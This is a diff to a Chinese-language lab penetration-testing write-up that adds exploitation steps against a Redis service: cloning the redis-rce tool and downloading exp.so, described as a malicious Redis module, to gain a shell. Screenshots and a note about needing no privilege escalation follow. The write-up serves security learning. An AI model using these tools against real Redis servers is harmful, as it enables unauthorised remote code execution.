@@ -75,6 +75,26 @@ dirsearch -u  http://192.168.197.69:8080 -x 403,404,400
 
 ### 漏洞利用
 
+* 将redis-rce从Github上下载下来：
+
+```bash
+git clone https://github.com/Ridter/redis-rce.git
+```
+
+<figure><img src="../.gitbook/assets/19.png" alt=""><figcaption></figcaption></figure>
+
+* 直接执行该脚本，查看其利用方法，得知目前还差一个exp.so文件，该文件是redis的一个恶意模块，下载下来作为参数执行该脚本：
+
+```bash
+wget https://github.com/n0b0dyCN/redis-rogue-server/blame/master/exp.so
+```
+
+<figure><img src="../.gitbook/assets/20.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/21.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/23.png" alt=""><figcaption></figcaption></figure>
+
 *
 
 
@@ -83,29 +103,9 @@ dirsearch -u  http://192.168.197.69:8080 -x 403,404,400
 
 
 
-### GET SHELL
 
 
 
-
-
-
-
-
-
-
-
-## 权限提升
-
-### 本地信息收集
-
-
-
-
-
-
-
-### 漏洞利用
 
 
 
@@ -124,5 +124,7 @@ dirsearch -u  http://192.168.197.69:8080 -x 403,404,400
 
 
 {% hint style="info" %}
+本例没有提权过程，Get Shell后即可拿到最高权限，属于简单机器。
+
 （二刷机器，补笔记。本例机器中途重置过，IP地址有变化，不影响漏洞利用及其实现结果）
 {% endhint %}
